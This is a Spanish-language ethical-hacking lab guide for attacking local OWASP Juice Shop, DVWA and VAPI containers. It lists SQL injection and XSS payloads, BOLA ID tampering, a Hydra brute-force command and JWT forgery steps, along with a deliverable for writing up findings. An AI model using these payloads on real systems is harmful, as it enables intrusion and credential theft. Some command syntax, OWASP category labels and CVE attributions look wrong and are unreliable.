# 🕷️ Unidad 3: Explotación Web y APIs 2026 - LAB PRÁCTICO

## 📋 Arquitectura
- **DVWA (Port 80)**: SQLi y XSS clásico (Hacking tradicional).
- **Juice Shop (Port 3000)**: Web moderna (Node.js/Angular), NoSQL, JWT, XSS avanzado.
- **VAPI (Port 8081)**: Laboratorio de seguridad de APIs REST (BOLA, Mass Assignment).
- **Kali Linux (172.18.3.20)**: Entorno atacante.

## 🚀 Instrucciones de Ejecución

### Opción 1: Usar scripts de automatización (Recomendado)
```bash
cd /ruta/a/tu/directorio/Ethical_Hacking/docker-labs/lab3

# Iniciar el lab
./setup.sh

# Verificar estado
./check-lab.sh
```

### Opción 2: Manual con Docker Compose
```bash
# Iniciar el lab
docker-compose up -d

# Verificar estado
docker-compose ps

# Detener y eliminar el lab
docker-compose down -v
```

## 🎯 Objetivos de Aprendizaje
Al completar este laboratorio, serás capaz de:
1. Identificar y explotar vulnerabilidades OWASP Top 10 en una aplicación web moderna
2. Utilizar herramientas como Burp Suite, OWASP ZAP y técnicas manuales para descubrimiento
3. Documentar hallazgos con pasos de reproducción claros
4. Entender el impacto empresarial de cada vulnerabilidad encontrada

## 🛠️ Herramientas Recomendadas
- **Burp Suite Community Edition** (proxy/interceptor)
- **OWASP ZAP** (alternativa gratuita)
- **Navegador web** con herramientas de desarrollador
- **curl** o **wget** para pruebas manuales
- **sqlmap** (para inyecciones SQL avanzadas)
- **jwt_tool** (para manipulación de tokens JWT)

## 📋 Vulnerabilidades a Explotar

### 1. SQL Injection (A03:2021)

#### Paso 1: Identificar puntos de inyección
**Tu tarea**: Probar payloads en campos de búsqueda, filtros y formularios.

**Payloads para probar (escribir manualmente):**
```bash
# En campo de búsqueda de productos:
' OR '1'='1
' OR '1'='1'--
") OR ("1"="1
") OR ("1"="1"--
```

**Resultado esperado**: Deberías ver resultados de búsqueda que muestran todos los productos en lugar de solo los que coinciden con tu término de búsqueda.
**Pista para capturar flags**: Busca tablas inusuales como 'flags', 'secrets' o 'keys' en información_schema.tables. También busca columnas como 'flag', 'secret', 'key' o 'token' en tablas de usuarios.

#### Paso 2: Extraer información de la base de datos
**Tu tarea**: Utilizar técnicas avanzadas de SQLi para extraer datos sensibles.

**Comandos para probar (en contextos apropiados):**
```bash
# Determinar número de columnas
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# Extraer información de la base de datos
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,email,password,3 FROM users--
```

**Resultado esperado**: Lista de tablas, columnas y finalmente credenciales de usuarios en formato hash.

### 2. Cross-Site Scripting (XSS) (A07:2021)

#### Paso 1: Identificar campos vulnerables
**Tu tarea**: Buscar campos de entrada que reflejen el usuario sin sanitización adecuada.

**Payloads para probar (escribir manualmente):**
```bash
# En campos de búsqueda, comentarios o reseñas:
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
```

**Pista**: Busca campos donde tu entrada aparezca exactamente como la ingresaste en la respuesta HTML.

**Resultado esperado**: Alerta de JavaScript ejecutada en el navegador que muestra 'XSS'.
**Pista para capturar flags**: Busca campos donde puedas almacenar XSS que luego se muestre en páginas administrativas o de otros usuarios. Las flags podrían estar ocultas en atributos como data-flag o en comentarios HTML.

#### Paso 2: XSS Almacenado (Persistente)
**Tu tarea**: Encontrar puntos donde el XSS se guarde y se ejecute para otros usuarios.

**Comando para probar:**
```bash
# En campos de reseñas de productos o comentarios:
<script>alert('XSS Persistente desde [tu nombre]')</script>
```

**Pista**: Busca funcionalidades como reseñas de productos, comentarios en pedidos o cualquier campo donde tu entrada se guarde en la base de datos y se muestre a otros usuarios.

**Resultado esperado**: Cuando otro usuario (o tú mismo en una sesión diferente) ve la página donde se almacenó el XSS, debería ejecutarse una alerta.

#### Paso 3: DOM-based XSS
**Tu tarea**: Identificar vulnerabilidades que dependen de JavaScript del cliente.

**Comando para probar:**
```bash
# En la URL o en campos que se procesen con JavaScript:
#javascript:alert('XSS')
```

**Resultado esperado**: Alerta de JavaScript ejecutada al manipular el DOM directamente.

### 3. Broken Object Level Authorization (BOLA) (A01:2021)

#### Paso 1: Identificar endpoints vulnerables
**Tu tarea**: Manipular IDs en rutas para acceder a recursos de otros usuarios.

**Comandos para probar (ejemplo con facturas):**
```bash
# En lugar de /api/orders/1, probar:
/api/orders/2
/api/orders/3
/api/orders/100
/api/orders/9999
```

**Resultado esperado**: Acceso a facturas o datos de otros usuarios sin autorización adecuada.

#### Paso 2: Explotar BOLA en reseñas
**Tu tarea**: Modificar IDs de reseñas para editar o eliminar reseñas de otros usuarios.

**Comando para probar:**
```bash
# En lugar de /api/reviews/1, probar:
/api/reviews/[ID_de_reseña_de_otro_usuario]
```

**Resultado esperado**: Poder modificar o eliminar una reseña que no creaste.

### 4. Security Misconfiguration (A05:2021)

#### Paso 1: Análisis de cabeceras HTTP
**Tu tarea**: Obtener y analizar las cabeceras HTTP de la aplicación.

**Comando para probar:**
```bash
curl -I http://localhost:3000
```

**Cabeceras de seguridad a buscar:**
- `Content-Security-Policy`: Previene XSS y inyección de datos
- `X-Frame-Options`: Previene clickjacking
- `Strict-Transport-Security`: Fuerza HTTPS
- `X-Content-Type-Options`: Previene MIME sniffing
- `Referrer-Policy`: Controla información de referencia
- `Permissions Policy`: Controla acceso a características del navegador

**Resultado esperado**: Identificación de cabeceras de seguridad ausentes o mal configuradas.

### 5. Vulnerabilidades de Autenticación (A07:2021)

#### Paso 1: Fuerza bruta de credenciales
**Tu tarea**: Probar ataques de fuerza bruta en el endpoint de login.

**Comando para probar:**
```bash
# Usando Hydra o similar para fuerza bruta
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/api/users/login:email=^PASS^&password=^PASS^:Invalid login"
```

**Resultado esperado**: Credenciales válidas descubiertas (además de admin/admin123).

#### Paso 2: Jwt token manipulation
**Tu tarea**: Analizar y manipular tokens JWT para elevación de privilegios.

**Pasos para probar:**
1. Inicia sesión como usuario normal
2. Captura el token JWT de la respuesta o del localStorage
3. Decodifica el token (header.payload.signature)
4. Modifica el payload para cambiar rol o usuario
5. Vuelve a codificar y prueba usar el token modificado

**Comando para probar (usando jwt_tool):**
```bash
# Decodificar token
jwt_tool decode <tu_token_aqui>

# Modificar rol (ejemplo)
jwt_tool modify <tu_token_aqui> -p "role":"admin"

# Crear token falso
jwt_tool create -p "email":"admin@juice-shop.com","role":"admin","sub":"1"
```

**Resultado esperado**: Acceso a funcionalidades reservadas para administradores.

### 6. Vulnerabilidades de Craqueo Inseguro (A08:2021)

#### Paso 1: Análisis de dependencias vulnerables
**Tu tarea**: Identificar versiones antiguas de paquetes npm conocidos por tener vulnerabilidades.

**Comando para probar:**
```bash
# Listar paquetes instalados (si tienes acceso al código fuente)
npm list

# O verificar paquetes conocidos:
npm show express version
npm show angular version
```

**Resultado esperado**: Identificación de paquetes con versiones conocidas por tener CVEs.

### 7. Identificación y Corrección de Fallos en el Software y Registro de Datos (A09:2021)

#### Paso 1: Análisis de logs y manejo de errores
**Tu tarea**: Probar cómo la aplicación maneja errores y qué información revela.

**Comando para probar:**
```bash
# Probar endpoints inexistentes
curl -v http://localhost:3000/endpoint-que-no-existe
curl -v http://localhost:3000/api/nonexistent

# Probar parámetros malformados
curl -v "http://localhost:3000/api/BasketItems?itemId=sql'injection"
```

**Resultado esperado**: Mensajes de error que no revelen información interna innecesaria (stack traces, rutas de archivos, etc.).

### 8. Falta de Registro y Monitoreo (A09:2021)

#### Paso 1: Evaluar capacidad de detección
**Tu tarea**: Intentar realizar actividades maliciosas y observar si quedan registros.

**Comando para probar:**
```bash
# Realizar múltiples intentos fallidos de login
for i in {1..20}; do
  curl -X POST "http://localhost:3000/api/users/login" \
       -H "Content-Type: application/json" \
       -d '{"email":"test@example.com","password":"wrongpass"}'
done

# Luego revisar logs (si tienes acceso)
# o verificar si hay mecanismos de bloqueo o notificación
```

**Resultado esperado**: La aplicación debería tener mecanismos para detectar y responder a patrones de actividad sospechosa.

## 🧹 Limpieza

### Opción 1: Usar scripts de automatización (Recomendado)
```bash
cd /ruta/a/tu/directorio/Ethical_Hacking/docker-labs/lab3

# Resetear el lab (eliminar todo)
./reset.sh
```

### Opción 2: Manual con Docker Compose
```bash
# Detener y eliminar el lab
docker-compose down -v

# Eliminar imágenes y volúmenes (opcional, para inicio limpio)
docker system prune -f
```

## 📝 Entregable

**Archivo**: `juice_shop_exploitation.md`

**Contenido obligatorio**:
- Descripción técnica de cada vulnerabilidad explotada
- Pasos para reproducir (con comandos completados que escribiste manualmente)
- Request/Response capturado (cuando corresponda)
- Impacto de cada vulnerabilidad
- Recomendación de remediación específica

**Evidencia mínima aceptable**:
- Capturas de pantalla de cada tipo de vulnerabilidad explotada
- Archivo `juice_shop_exploitation.md` con al menos 5 vulnerabilidades documentadas
- Logs de tus intentos de explotación (cuando sea relevante)

## 💡 Tips para el Éxito

1. **Escribe todos los comandos manualmente** - Esto te ayuda a entender qué hace cada parte
2. **Toma notas detalladas** - Documenta qué funcionó, qué no y por qué
3. **Usa Burp Suite o OWASP ZAP** - Para interceptar y modificar requests en tiempo real
4. **Prueba una cosa a la vez** - No mezcles múltiples vectores en un mismo request al principio
5. **Verifica tu éxito** - Después de cada exploitation, confirma que realmente lograste lo que pretendías
6. **Piensa como un defensor** - Después de explotar, piensa en cómo podrías detectar y prevenir cada vulnerabilidad
7. **Sé metódico** - Trabaja de forma ordenada siguiendo el OWASP Top 10

## 📚 Recursos Adicionales

- [OWASP Juice Shop Official Site](https://owasp.org/www-project-juice-shop/)
- [OWASP Juice Shop Documentation](https://pwni.infosecinstitute.com/owasp-juice-shop/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Top 10 - 2021](https://owasp.org/Top10/)
- [Cheat Sheet Series - OWASP](https://cheatsheetseries.owasp.org/)
- [JSON Web Token (JWT) Handbook](https://auth0.com/resources/ebooks/jwt-handler)

## 🔬 Referencias de CVE Comunes en Juice Shop

- CVE-2020-28052: Prototype Pollution en lodash
- CVE-2021-23406: Prototype Pollution en js-yaml
- CVE-2022-24785: Command Injection en yargs-parser
- CVE-2022-23634: Path Traversal en @jsdevtools/ono
- CVE-2021-43856: Regular Expression Denial of Service (ReDoS) en ansi-regex

---
*Nota: Este laboratorio es para fines educativos únicamente. Todas las técnicas descritas deben aplicarse únicamente en entornos autorizados y legales.*
